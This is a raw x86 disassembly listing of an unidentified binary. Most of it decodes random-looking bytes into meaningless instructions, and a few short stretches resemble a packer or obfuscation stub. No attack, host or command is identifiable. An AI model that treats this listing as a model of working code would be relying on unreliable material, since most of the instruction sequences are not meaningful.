  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebp+0x45],dx
  412e77:	pop    ecx
  412e78:	pop    dx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x1570707e
  412e82:	and    esp,DWORD PTR [ebx-0x80]
  412e85:	das    
  412e86:	or     cl,BYTE PTR [ebp-0x17e530f]
  412e8c:	outs   dx,DWORD PTR ds:[esi]
  412e8d:	loopne 0x412e9b
  412e8f:	adc    eax,0x33ca16be
  412e94:	in     al,dx
  412e95:	aas    
  412e96:	cwde   
  412e97:	outs   dx,DWORD PTR ds:[esi]
  412e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e99:	push   eax
  412e9a:	stos   BYTE PTR es:[edi],al
  412e9b:	fwait
  412e9c:	push   esp
  412e9d:	sub    DWORD PTR [ebp+ecx*1-0x2a],ebx
  412ea1:	test   eax,0x9df02419
  412ea6:	inc    ebx
  412ea7:	cmp    BYTE PTR [ecx],dl
  412ea9:	ss pusha 
  412eab:	int    0x60
  412ead:	and    al,BYTE PTR [ecx*4+0x39058fb6]
  412eb4:	xor    BYTE PTR [eax],cl
  412eb6:	nop
  412eb7:	dec    ebx
  412eb8:	push   0x14
  412eba:	rol    BYTE PTR [ecx],cl
  412ebc:	fcom   DWORD PTR [eax]
  412ebe:	retf   0x8f30
  412ec1:	jo     0x412eec
  412ec3:	stc    
  412ec4:	mov    dh,0x98
  412ec6:	jmp    0xe792:0x242f0715
  412ecd:	pop    esp
  412ece:	xor    BYTE PTR [esi],cl
  412ed0:	mov    bl,0xa3
  412ed2:	pop    esi
  412ed3:	(bad)
  412ed6:	mov    edx,0x7bab8377
  412edb:	jno    0x412f51
  412edd:	add    DWORD PTR [ebx+eax*4],eax
  412ee0:	lahf   
  412ee1:	push   ebp
  412ee2:	aad    0x30
  412ee4:	out    dx,eax
  412ee5:	push   es
  412ee6:	loopne 0x412ee6
  412ee8:	push   ebx
  412ee9:	or     al,0x32
  412eeb:	cmp    al,0xd1
  412eed:	(bad)  
  412eef:	jp     0x412ee4
  412ef1:	dec    esp
  412ef2:	dec    edi
  412ef3:	pop    ds
  412ef4:	jns    0x412f64
  412ef6:	sbb    eax,0xa2b82da3
  412efb:	ja     0x412eb8
  412efd:	adc    ebp,DWORD PTR [ebp-0x58f0ac40]
  412f03:	add    BYTE PTR [edi+0x2a],bl
  412f06:	bswap  ebp
  412f08:	pop    esp
  412f09:	rcl    al,cl
  412f0b:	fs jmp 0x4b6e:0x4f296488
  412f13:	fs push ds
  412f15:	ja     0x412ec7
  412f17:	ret    
  412f18:	arpl   bp,bx
  412f1a:	add    bl,ch
  412f1c:	sahf   
  412f1d:	pop    esi
  412f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f1f:	daa    
  412f20:	or     ah,dl
  412f22:	cmp    al,0xa
  412f24:	lods   eax,DWORD PTR ds:[esi]
  412f25:	jb     0x412f0a
  412f27:	pop    ebp
  412f28:	and    eax,DWORD PTR [ecx]
  412f2a:	(bad)  
  412f2b:	cdq    
  412f2c:	push   edi
  412f2d:	icebp  
  412f2e:	and    al,0x6f
  412f30:	mov    DWORD PTR [ecx],0x17da8b8c
  412f36:	xchg   ecx,eax
  412f37:	xchg   BYTE PTR [ecx],ch
  412f39:	mov    esi,0xacaf56bb
  412f3e:	sbb    BYTE PTR [ebx+0x45],bl
  412f41:	repz sub cl,0xb5
  412f45:	retf   0x1bed
  412f48:	or     BYTE PTR [edi-0x2f5e7369],bh
  412f4e:	xchg   ebx,eax
  412f4f:	js     0x412f67
  412f51:	rcl    BYTE PTR [eax+0x61],1
  412f54:	cwde   
  412f55:	pop    edx
  412f56:	test   BYTE PTR [esi],dl
  412f58:	and    BYTE PTR [ebp+0x2f],bl
  412f5b:	push   esi
  412f5c:	mov    edi,0x16d31990
  412f61:	rol    BYTE PTR [esp+ecx*4-0x31],1
  412f65:	stc    
  412f66:	jge    0x412f88
  412f68:	addr16 jno 0x412f1e
  412f6b:	xchg   bh,ah
  412f6d:	adc    DWORD PTR [esi-0x7144cdd1],esi
  412f73:	and    al,0x91
  412f75:	stos   BYTE PTR es:[edi],al
  412f76:	cmovnp esp,ebx
  412f79:	mov    eax,0xc33dae23
  412f7e:	mov    eax,0xefb2a454
  412f83:	mov    al,ds:0x1515853d
  412f88:	mov    edx,0xe41c46ee
  412f8d:	mov    dh,0xb2
  412f8f:	push   ebp
  412f90:	or     al,0xab
  412f92:	jne    0x412fd5
  412f94:	mov    ch,ah
  412f96:	jbe    0x412f7e
  412f98:	xor    edx,DWORD PTR [ecx+esi*1+0x60]
  412f9c:	inc    edx
  412f9d:	xchg   edx,eax
  412f9e:	pop    ds
  412f9f:	mov    BYTE PTR [esi-0x7f],dl
  412fa2:	sar    DWORD PTR [ecx],1
  412fa4:	pop    esp
  412fa5:	xchg   edx,eax
  412fa6:	fiadd  WORD PTR [edi-0x63]
  412fa9:	and    edx,edi
  412fab:	pop    ebx
  412fac:	jp     0x412fee
  412fae:	lahf   
  412faf:	retf   
  412fb0:	inc    DWORD PTR [ebx+0x35607cbc]
  412fb6:	call   0x584bd963
  412fbb:	mov    esi,cs
  412fbd:	xor    DWORD PTR [esi-0x392699de],0x3ba2821b
  412fc7:	outs   dx,DWORD PTR ds:[esi]
  412fc8:	xor    DWORD PTR [ecx+edi*8-0x457e2dab],ebp
  412fcf:	push   0xfffffff4
  412fd1:	dec    BYTE PTR [ebp+0x79]
  412fd4:	cmc    
  412fd5:	adc    eax,0x15f38817
  412fda:	loopne 0x41302f
  412fdc:	into   
  412fdd:	sub    dl,dh
  412fdf:	test   BYTE PTR [esp+edx*1-0x3266e2c8],dl
  412fe6:	sbb    BYTE PTR [ebx-0x3c],al
  412fe9:	cmp    eax,0x35c0f514
  412fee:	out    0x7e,al
  412ff0:	dec    esp
  412ff1:	mov    DWORD PTR [esi+ebp*2+0x8],edx
  412ff5:	lods   eax,DWORD PTR cs:[esi]
  412ff7:	cmp    esi,ebx
  412ff9:	inc    edx
  412ffa:	xchg   esi,eax
  412ffb:	shl    DWORD PTR [eax-0x6c],cl
  412ffe:	cmp    eax,0xd51160e1
  413003:	jge    0x412fdc
  413005:	jl     0x412f88
  413007:	inc    edx
  413008:	inc    ebp
  413009:	or     ebx,esp
  41300b:	stos   DWORD PTR es:[edi],eax
  41300c:	pop    ss
  41300d:	mov    esp,0x8167866
  413012:	pop    es
  413013:	les    ebp,FWORD PTR [edx+0x1e]
  413016:	adc    BYTE PTR [edi-0x48],ah
  413019:	xchg   ebx,eax
  41301a:	or     al,0x14
  41301c:	lds    eax,FWORD PTR [edi]
  41301e:	mov    ebx,0xf4b4476d
  413023:	mov    al,ds:0x8832c92e
  413028:	pop    ss
  413029:	js     0x413057
  41302b:	add    al,0x11
  41302d:	mov    cl,0x98
  41302f:	dec    ecx
  413030:	ss ss pop edx
  413033:	inc    edi
  413034:	jl     0x41305c
  413036:	pop    ecx
  413037:	dec    eax
  413038:	out    dx,al
  413039:	sbb    bh,BYTE PTR [ebp+0x44275cb9]
  41303f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413040:	push   cs
  413041:	cmp    ebp,DWORD PTR [ecx+0x2f]
  413044:	mov    ds:0xab2df5c,al
  413049:	jmp    0x75d3eee3
  41304e:	fistp  WORD PTR [eax]
  413050:	xchg   esp,eax
  413051:	mov    ebx,0x5926ea18
  413056:	adc    dh,BYTE PTR [ebx+0x2b07494]
  41305c:	fimul  WORD PTR [edx]
  41305e:	jl     0x412fe1
  413060:	cmc    
  413061:	nop
  413062:	xor    edi,DWORD PTR [ebp+0x4ef97254]
  413068:	cmp    edx,DWORD PTR [ebx-0x3b]
  41306b:	pushf  
  41306c:	jae    0x413095
  41306e:	je     0x413009
  413070:	in     ax,0x87
  413073:	inc    esp
  413074:	stos   BYTE PTR es:[edi],al
  413075:	xchg   esp,eax
  413076:	loope  0x41304c
  413078:	fcom   DWORD PTR [edx]
  41307a:	lea    edi,ds:0xfde00589
  413080:	jo     0x4130cf
  413082:	xlat   BYTE PTR ds:[ebx]
  413083:	inc    esp
  413084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413085:	shl    ah,cl
  413087:	(bad)  
  413088:	xchg   ebx,eax
  413089:	and    eax,0xf0aa26cf
  41308e:	(bad)  
  41308f:	outs   dx,BYTE PTR ds:[esi]
  413090:	push   DWORD PTR [eax+0x42cdec67]
  413096:	cmp    al,0x4c
  413098:	push   ds
  413099:	and    al,0x2c
  41309b:	xor    ch,BYTE PTR [esi]
  41309d:	popa   
  41309e:	fs lock jbe 0x41306a
  4130a2:	mov    dl,0xbe
  4130a4:	cmp    eax,0xf25318d2
  4130a9:	jno    0x4130b3
  4130ab:	nop
  4130ac:	xor    eax,0x339630a1
  4130b1:	inc    esp
  4130b2:	sahf   
  4130b3:	push   es
  4130b4:	push   cs
  4130b5:	fld    DWORD PTR [ebp-0x276200c3]
  4130bb:	div    BYTE PTR [ecx]
  4130bd:	mov    WORD PTR [edx-0x4b639eef],?
  4130c3:	mov    esp,0xaf927915
  4130c8:	out    0xb3,eax
  4130ca:	mov    ds:0xa8dc8b2b,eax
  4130cf:	loopne 0x4130b6
  4130d1:	stos   BYTE PTR es:[edi],al
  4130d2:	mov    eax,ds:0x35e93778
  4130d7:	fmul   st(2),st
  4130d9:	or     ah,al
  4130db:	(bad)  
  4130dd:	add    ch,BYTE PTR [edx+0x4f]
  4130e0:	xchg   esi,eax
  4130e1:	jb     0x4130da
  4130e3:	sbb    bl,BYTE PTR [ebx+0x536072a1]
  4130e9:	mov    ch,0x20
  4130eb:	pop    ds
  4130ec:	cmp    DWORD PTR [edx],ebx
  4130ee:	ret    0xaffb
  4130f1:	fiadd  WORD PTR [ebx]
  4130f3:	xchg   edi,eax
  4130f4:	dec    DWORD PTR [edi+0x7d]
  4130f7:	out    dx,eax
  4130f8:	or     DWORD PTR [ebx+edx*1],0xb
  4130fc:	rol    DWORD PTR [eax+0x44ce7425],cl
  413102:	jmp    0xf530:0x76fc3a1e
  413109:	jnp    0x413093
  41310b:	adc    ebp,DWORD PTR [ecx+0x5d]
  41310e:	daa    
  41310f:	adc    eax,0xedaf68f3
  413114:	shr    BYTE PTR [eax],1
  413116:	or     eax,0x4eecc4d2
  41311b:	ret    
  41311c:	or     ch,BYTE PTR [eax]
  41311e:	jecxz  0x413115
  413120:	push   edx
  413121:	jg     0x4130d4
  413123:	inc    edi
  413124:	(bad)  
  413125:	push   0xc9602f9d
  41312a:	sub    BYTE PTR [eax-0x24],bh
  41312d:	push   es
  41312e:	aad    0x23
  413130:	jge    0x413126
  413132:	jns    0x4130d8
  413134:	test   BYTE PTR [eax+0x69],0x38
  413138:	rcr    DWORD PTR [edx+ebx*8-0x700ec6a9],0x7c
  413140:	loop   0x4130c5
  413142:	test   DWORD PTR [edx],eax
  413144:	jbe    0x4131b4
  413146:	es jne 0x4130d2
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fd79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e1a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	outs   dx,BYTE PTR ds:[esi]
  41317f:	les    ecx,FWORD PTR [ebp+0x7061a3fc]
  413185:	jo     0x413140
  413187:	jle    0x4131f9
  413189:	jo     0x4131c6
  41318b:	pop    edx
  41318c:	push   ecx
  41318d:	mov    ch,dl
  41318f:	push   edi
  413190:	xor    eax,0xf88f67bf
  413195:	dec    edx
  413196:	push   es
  413197:	jae    0x41317e
  413199:	or     edx,eax
  41319b:	sub    al,0x25
  41319d:	out    0xb7,eax
  41319f:	cmp    BYTE PTR [eax],dl
  4131a1:	or     edi,DWORD PTR [eax-0x19]
  4131a4:	push   0xf7a9c6e9
  4131a9:	push   cs
  4131aa:	out    dx,al
  4131ab:	test   al,0x2
  4131ad:	rcr    DWORD PTR [eax+0x4d],cl
  4131b0:	leave  
  4131b1:	mov    al,ds:0x9bb0ec7
  4131b6:	dec    edx
  4131b7:	push   edx
  4131b8:	cmp    DWORD PTR [ebx-0x6d99b878],esp
  4131be:	lahf   
  4131bf:	pop    edi
  4131c0:	stos   DWORD PTR es:[edi],eax
  4131c1:	out    0x71,eax
  4131c3:	cmc    
  4131c4:	inc    edi
  4131c5:	inc    ebx
  4131c6:	mov    eax,ds:0xc89ac059
  4131cb:	sbb    DWORD PTR [edx-0x6661441a],edx
  4131d1:	inc    esp
  4131d2:	repz jl 0x41323f
  4131d5:	add    edi,DWORD PTR [eiz*1-0x5a34de4]
  4131dc:	push   0xffffffeb
  4131de:	inc    ecx
  4131df:	dec    ebp
  4131e0:	shl    DWORD PTR [ebx+eax*4],1
  4131e3:	pop    edx
  4131e4:	xor    eax,0x724e1d9
  4131e9:	mov    esi,0xa09cf125
  4131ee:	pop    ds
  4131ef:	sbb    bl,bh
  4131f1:	xor    BYTE PTR [edi],dl
  4131f3:	mov    ch,0xf3
  4131f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f6:	outs   dx,DWORD PTR ds:[esi]
  4131f7:	retf   0x8d4d
  4131fa:	mov    esi,0x833d8cc4
  4131ff:	jecxz  0x41323a
  413201:	add    BYTE PTR [eax+0x8],al
  413204:	mov    edx,0x78eacca0
  413209:	(bad)  
  41320b:	retf   
  41320c:	shl    BYTE PTR [eax-0x63],cl
  41320f:	cwde   
  413210:	lods   eax,DWORD PTR ds:[esi]
  413211:	pop    ebp
  413212:	dec    eax
  413213:	cmp    al,0x84
  413215:	adc    eax,0x4139d059
  41321a:	mov    esi,0x7386edf6
  41321f:	mov    es,WORD PTR [edx]
  413221:	xchg   DWORD PTR [ebx],eax
  413223:	pop    edi
  413224:	fist   WORD PTR [ebp+0x1dd1ff21]
  41322a:	mov    ecx,edi
  41322c:	push   ds
  41322d:	mov    ebx,0x7e2fc4f9
  413232:	add    ah,bl
  413234:	and    eax,0x7e878ffd
  413239:	dec    esi
  41323a:	fnstenv [ebx]
  41323c:	mov    ecx,0xc0db93ad
  413241:	cs mov ebp,0x566589db
  413247:	sbb    eax,0xa075eacb
  41324c:	ret    
  41324d:	mov    dh,BYTE PTR [esi-0x72]
  413250:	jo     0x413285
  413252:	loop   0x41329d
  413254:	aam    0xaa
  413256:	sub    al,0x6
  413258:	ins    DWORD PTR es:[edi],dx
  413259:	mov    ?,esp
  41325b:	sub    dl,0x9e
  41325e:	mov    eax,0x9614833
  413263:	(bad)
  413267:	xchg   ecx,eax
  413268:	fisttp DWORD PTR [ecx]
  41326a:	xchg   ecx,eax
  41326b:	xchg   ebx,eax
  41326c:	int    0xe1
  41326e:	dec    ebx
  41326f:	or     esp,esi
  413271:	loope  0x41329a
  413273:	int    0x5e
  413275:	ficomp DWORD PTR [edx+esi*8-0xe367b68]
  41327c:	(bad)  
  41327d:	nop
  41327e:	test   BYTE PTR [ebx+0x66],ah
  413281:	pop    ss
  413282:	add    DWORD PTR [edx],ebp
  413284:	rcl    dl,cl
  413286:	xchg   edi,eax
  413287:	jmp    esp
  413289:	and    eax,0x85210e69
  41328e:	int3   
  41328f:	stc    
  413290:	xchg   ebx,eax
  413291:	repz sub DWORD PTR [edx+0x7a],esi
  413295:	dec    edi
  413296:	adc    ebx,DWORD PTR [edx+edx*1]
  413299:	add    al,0x79
  41329b:	test   BYTE PTR [edi+eax*4+0x40],dl
  41329f:	shl    DWORD PTR [edx-0x6b],1
  4132a2:	mov    ch,0xa3
  4132a4:	sub    DWORD PTR [edi],0xa1411ed6
  4132aa:	jp     0x413253
  4132ac:	inc    esi
  4132ad:	add    eax,0x552af9e7
  4132b2:	cmp    al,0xa8
  4132b4:	rol    ecx,cl
  4132b6:	out    dx,al
  4132b7:	push   edi
  4132b8:	push   edi
  4132b9:	push   es
  4132ba:	or     al,0xc2
  4132bc:	jno    0x4132d0
  4132be:	les    ebp,FWORD PTR [esi]
  4132c0:	jne    0x413307
  4132c2:	cmc    
  4132c3:	daa    
  4132c4:	(bad)  
  4132c5:	pop    ebp
  4132c6:	jbe    0x4132fd
  4132c8:	lahf   
  4132c9:	les    ebp,FWORD PTR [ebx]
  4132cb:	outs   dx,BYTE PTR ds:[esi]
  4132cc:	into   
  4132cd:	aad    0xbd
  4132cf:	mov    WORD PTR [edx+0x60],ss
  4132d2:	jnp    0x413342
  4132d4:	cld    
  4132d5:	loopne 0x41328f
  4132d7:	sub    ah,BYTE PTR [edi]
  4132d9:	adc    al,0x28
  4132db:	arpl   ax,ax
  4132dd:	gs stc 
  4132df:	push   ds
  4132e0:	je     0x413355
  4132e2:	pop    eax
  4132e3:	hlt    
  4132e4:	xor    DWORD PTR ds:0x6cdc841d,ebx
  4132ea:	daa    
  4132eb:	fnstenv [ebx-0x7eaf89d5]
  4132f1:	fisub  WORD PTR [edx+ebx*1]
  4132f4:	sahf   
  4132f5:	repnz pop ecx
  4132f7:	int    0x7a
  4132f9:	sbb    BYTE PTR [esi],al
  4132fb:	ds pop edi
  4132fd:	xor    edx,edx
  4132ff:	fs and eax,0x21ebf733
  413305:	and    BYTE PTR [eax-0x15],0x67
  413309:	push   cs
  41330a:	(bad)  
  41330c:	mov    ah,0xa9
  41330e:	xchg   DWORD PTR [esi+0x3f],edx
  413311:	test   BYTE PTR [edi+ebp*4+0x499f267],al
  413318:	loop   0x4132a6
  41331a:	xor    dl,BYTE PTR [ecx]
  41331c:	fstp   TBYTE PTR ds:0x386c8462
  413322:	repnz pop es
  413324:	ror    BYTE PTR ds:0xf0cb5331,1
  41332a:	jp     0x41338b
  41332c:	inc    ebx
  41332d:	loope  0x413336
  41332f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413330:	fst    QWORD PTR [edx]
  413332:	jae    0x413315
  413334:	xchg   eax,ecx
  413336:	popf   
  413337:	stos   DWORD PTR es:[edi],eax
  413338:	push   ebx
  413339:	scas   al,BYTE PTR es:[edi]
  41333a:	mov    dl,0xa5
  41333c:	xchg   esp,eax
  41333d:	mov    ah,0x39
  41333f:	fs push ds
  413341:	rol    BYTE PTR [eax-0x5e1052c8],0xaa
  413348:	adc    BYTE PTR [eax+0x15],al
  41334b:	aad    0xb
  41334d:	mov    cl,0x59
  41334f:	or     esi,edi
  413351:	push   ebx
  413352:	loop   0x413349
  413354:	(bad)
  413358:	mov    dl,0x98
  41335a:	in     al,0x7e
  41335c:	add    ch,ch
  41335e:	cdq    
  41335f:	jno    0x4133d8
  413361:	and    eax,0xc8e5b814
  413366:	and    DWORD PTR [edi-0x48],edi
  413369:	in     eax,dx
  41336a:	leave  
  41336b:	cld    
  41336c:	jmp    0xc9dc:0xd2e68414
  413373:	jp     0x4133af
  413375:	cmp    eax,0x3aed8725
  41337a:	outs   dx,DWORD PTR ds:[esi]
  41337b:	push   cs
  41337c:	xor    eax,0x1d10ca69
  413381:	cmc    
  413382:	pop    DWORD PTR [ecx+0x2b]
  413385:	out    dx,eax
  413386:	dec    ebp
  413387:	ret    
  413388:	cmp    bh,bl
  41338a:	jmp    0x46fc:0xcbaa6ad5
  413391:	stos   BYTE PTR es:[edi],al
  413392:	dec    edi
  413393:	cmp    DWORD PTR [esi-0x2136da97],esp
  413399:	xchg   edx,eax
  41339a:	fstp   DWORD PTR [ebp-0x24]
  41339d:	adc    eax,0xc0a2dfd
  4133a2:	cmp    ebp,DWORD PTR [ebx]
  4133a4:	inc    esp
  4133a5:	push   esi
  4133a6:	fistp  WORD PTR [eax+ebp*1]
  4133a9:	inc    ebx
  4133aa:	jp     0x4133df
  4133ac:	pop    ds
  4133ad:	enter  0x3cf7,0x82
  4133b1:	mov    esp,0x6966f835
  4133b6:	rcl    edi,0xd4
  4133b9:	lds    ebx,FWORD PTR [ebx]
  4133bb:	mov    bl,0xe
  4133bd:	adc    eax,0x2100abf8
  4133c2:	fcom   st(7)
  4133c4:	sbb    dl,BYTE PTR [eax+0x5f60c8c2]
  4133ca:	and    ah,BYTE PTR [edi+0x16]
  4133cd:	add    DWORD PTR [edx+0x9a4d893],edi
  4133d3:	call   0x8fa674f9
  4133d8:	add    cl,BYTE PTR [ebp+0x1ade8679]
  4133de:	test   BYTE PTR [ebx+0x58c99848],dh
  4133e4:	sub    esp,DWORD PTR [edx-0x28c51cdd]
  4133ea:	push   0x0
  4133ec:	scas   eax,DWORD PTR es:[edi]
  4133ed:	sub    eax,eax
  4133ef:	xor    BYTE PTR gs:[ebp-0x5bd7d3dd],dh
  4133f6:	inc    DWORD PTR [edx]
  4133f8:	clc    
  4133f9:	out    0xb9,eax
  4133fb:	test   al,0xa4
  4133fd:	call   0x609186f7
  413402:	cli    
  413403:	rol    edi,0x6e
  413406:	test   edi,ebx
  413408:	repz inc ebp
  41340a:	sar    DWORD PTR [ebx-0x7ea71e92],0x61
  413411:	dec    eax
  413412:	popf   
  413413:	pop    ebp
  413414:	mov    BYTE PTR [edi+0x85dd0e9],0xfe
  41341b:	cmc    
  41341c:	repz mov al,ds:0x2c707acb
  413422:	mov    bl,0xb8
  413424:	push   edx
  413425:	or     al,0x5b
  413427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413428:	jnp    0x41348b
  41342a:	add    ah,BYTE PTR ds:[edx+0x163c1326]
  413431:	jg     0x41342d
  413433:	sub    eax,0x5a4f220b
  413438:	mov    DWORD PTR [ebx],edi
  41343a:	div    DWORD PTR [ebp+0x66]
  41343d:	and    BYTE PTR [ecx+0x729d0c01],cl
  413443:	mov    ebx,0x6da08c26
  413448:	stos   DWORD PTR es:[edi],eax
  413449:	scas   al,BYTE PTR es:[edi]
  41344a:	aas    
  41344b:	cmovo  esi,eax
  41344e:	ds mov esp,0xb8cb03aa
  413454:	and    DWORD PTR ds:[eax],eax
  413457:	add    BYTE PTR [ecx+0x458be04d],cl
  41345d:	loopne 0x41346e
  41345f:	test   BYTE PTR [esi],al
  413461:	pop    ss
  413462:	add    BYTE PTR [eax],al
  413464:	not    DWORD PTR ds:0x42fd79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fd55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xe1afd80f,al
  413492:	fs in  al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x5870707e
  41349c:	mov    edx,0xcf08d0fe
  4134a1:	rcr    bh,cl
  4134a3:	fdivrp st(3),st
  4134a5:	push   edx
  4134a6:	mov    cl,0x99
  4134a8:	out    0x53,eax
  4134aa:	cld    
  4134ab:	adc    DWORD PTR [edx-0x73],ebx
  4134ae:	repnz outs dx,BYTE PTR ds:[esi]
  4134b0:	adc    esi,DWORD PTR [ebp-0x7f]
  4134b3:	cmp    DWORD PTR [ecx+0x20f90c4e],0xffffffc1
  4134ba:	push   ebp
  4134bb:	adc    BYTE PTR [ebx],cl
  4134bd:	cmp    ah,BYTE PTR [esi+ebp*4]
  4134c0:	sub    dh,BYTE PTR [ecx+0x2a]
  4134c3:	adc    ch,0x81
  4134c6:	push   0xa15b9d84
  4134cb:	or     edi,ecx
  4134cd:	or     al,0xd0
  4134cf:	lods   al,BYTE PTR ds:[esi]
  4134d0:	jo     0x41350c
  4134d2:	sbb    DWORD PTR [ebx+0x53],0xfffffffb
  4134d6:	xor    eax,0x4031dc11
  4134db:	pop    edx
  4134dc:	outs   dx,DWORD PTR ds:[esi]
  4134dd:	retf   
  4134de:	or     DWORD PTR [ebp+0x59],eax
  4134e1:	pushf  
  4134e2:	fnstcw WORD PTR [ecx-0x4b6f2ff3]
  4134e8:	dec    esi
  4134e9:	imul   edi,DWORD PTR [edi+0x4cfdee00],0x53
  4134f0:	xchg   edx,eax
  4134f1:	int3   
  4134f2:	push   esp
  4134f3:	pop    ds
  4134f4:	cmp    cl,BYTE PTR [ebp-0x59]
  4134f7:	pop    eax
  4134f8:	ja     0x4134db
  4134fa:	es xchg edi,eax
  4134fc:	push   edx
  4134fd:	cmp    esi,edi
  4134ff:	mov    bl,0xf3
  413501:	fsub   QWORD PTR [ebx-0x74]
  413504:	lock push esi
  413506:	fidiv  WORD PTR [eax+0x71]
  413509:	stc    
  41350a:	add    dl,ah
  41350c:	mov    eax,ds:0x1be03eed
  413511:	inc    ebx
  413512:	shl    BYTE PTR [ecx+0x2c],0xb2
  413516:	aaa    
  413517:	in     eax,0x85
  413519:	pop    ds
  41351a:	rcl    DWORD PTR [edi+0x55],cl
  41351d:	ret    
  41351e:	xchg   BYTE PTR [esi],al
  413520:	jns    0x413563
  413522:	scas   ax,WORD PTR es:[edi]
  413524:	call   0x629dfbb
  413529:	dec    edx
  41352a:	test   bh,cl
  41352c:	pop    eax
  41352d:	mov    ebx,0x477c62ea
  413532:	xchg   DWORD PTR [eax],ebx
  413534:	out    0xdf,eax
  413536:	ins    BYTE PTR es:[edi],dx
  413537:	mov    ebp,edx
  413539:	push   0x835691e0
  41353e:	scas   al,BYTE PTR es:[edi]
  41353f:	mov    ch,0xd
  413541:	mov    esi,0xf0465643
  413546:	stos   BYTE PTR es:[edi],al
  413547:	stos   DWORD PTR es:[edi],eax
  413548:	xor    dl,bl
  41354a:	int    0x88
  41354c:	pop    esi
  41354d:	hlt    
  41354e:	jbe    0x413574
  413550:	dec    ebx
  413551:	das    
  413552:	icebp  
  413553:	mov    eax,ds:0x5eac2b91
  413558:	pop    ebp
  413559:	jmp    0x41356e
  41355b:	popa   
  41355c:	sbb    eax,0xdd3c6040
  413561:	int3   
  413562:	cmp    eax,0xd6c4c2fe
  413567:	push   0xd3161490
  41356c:	sbb    eax,0x54b974c4
  413571:	xor    ebx,DWORD PTR [ebx+0x8015693]
  413577:	mov    bl,0xe2
  413579:	push   ebx
  41357a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41357b:	mov    bh,0x90
  41357d:	jns    0x413553
  41357f:	icebp  
  413580:	dec    ebx
  413581:	pop    esp
  413582:	push   ss
  413583:	test   BYTE PTR [ecx],cl
  413585:	or     al,0x62
  413587:	loope  0x41352f
  413589:	or     DWORD PTR [ebx+0x49],ebx
  41358c:	mov    ds:0xc57cfca5,eax
  413591:	pop    edi
  413592:	xchg   edx,eax
  413593:	sub    eax,DWORD PTR [edx-0x4ab3ac1d]
  413599:	je     0x41354c
  41359b:	mov    bl,0xe0
  41359d:	xchg   BYTE PTR [ebx+0x44e5361e],cl
  4135a3:	in     al,dx
  4135a4:	inc    edx
  4135a5:	cmp    ecx,DWORD PTR [eax+0x45]
  4135a8:	je     0x4135f4
  4135aa:	xor    BYTE PTR [esi-0x24c85284],ch
  4135b0:	fbld   TBYTE PTR [edi+eiz*8]
  4135b3:	loopne 0x41360a
  4135b5:	dec    edx
  4135b6:	les    esi,FWORD PTR [edi+0x58]
  4135b9:	pop    ebx
  4135ba:	hlt    
  4135bb:	mov    al,ds:0xfe0c00a0
  4135c0:	(bad)  
  4135c1:	out    dx,al
  4135c2:	sbb    eax,DWORD PTR [esi-0x11]
  4135c5:	add    ebx,DWORD PTR [esi]
  4135c7:	dec    edx
  4135c8:	inc    edx
  4135c9:	adc    al,al
  4135cb:	nop
  4135cc:	das    
  4135cd:	dec    ebp
  4135ce:	jg     0x413646
  4135d0:	out    0xa5,eax
  4135d2:	out    dx,al
  4135d3:	out    dx,eax
  4135d4:	add    al,cl
  4135d6:	(bad)  [edi+0x17]
  4135d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135da:	(bad)  [esi]
  4135dc:	mov    ds:0x1bc24e9f,eax
  4135e1:	ins    BYTE PTR es:[edi],dx
  4135e2:	lods   al,BYTE PTR ds:[esi]
  4135e3:	cmp    dh,BYTE PTR [eax]
  4135e5:	jbe    0x4135e8
  4135e7:	add    dl,BYTE PTR [edi]
  4135e9:	mov    ecx,0xdebaf4ba
  4135ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135ef:	xchg   edi,eax
  4135f0:	push   ss
  4135f1:	shr    DWORD PTR [ecx-0x6b],1
  4135f4:	jb     0x413599
  4135f6:	and    al,0x63
  4135f8:	or     DWORD PTR [eax+0x3d8a548d],edi
  4135fe:	shl    DWORD PTR [eax+0x33],0x34
  413602:	shr    DWORD PTR ds:0xae0c1d95,cl
  413608:	push   ss
  413609:	push   0x4
  41360b:	mov    esi,0x4887df23
  413610:	dec    ebx
  413611:	(bad)  
  413612:	out    0xda,eax
  413614:	cmp    al,0xdc
  413616:	in     al,dx
  413617:	es ret 
  413619:	lea    esp,[ecx+0x4]
  41361c:	cdq    
  41361d:	aad    0xe0
  41361f:	ret    0x8601
  413622:	add    ebp,ebx
  413624:	mov    edi,ebp
  413626:	lds    esp,FWORD PTR [edi-0x65b70955]
  41362c:	int    0x71
  41362e:	cwde   
  41362f:	pop    eax
  413630:	imul   DWORD PTR [esi]
  413632:	xchg   DWORD PTR [edi+0x1154f7e8],esp
  413638:	mov    ah,0x21
  41363a:	cmp    eax,0x10f02b44
  41363f:	xor    BYTE PTR [esi+0x2d],ah
  413642:	fs out 0x99,al
  413645:	xor    al,0xa0
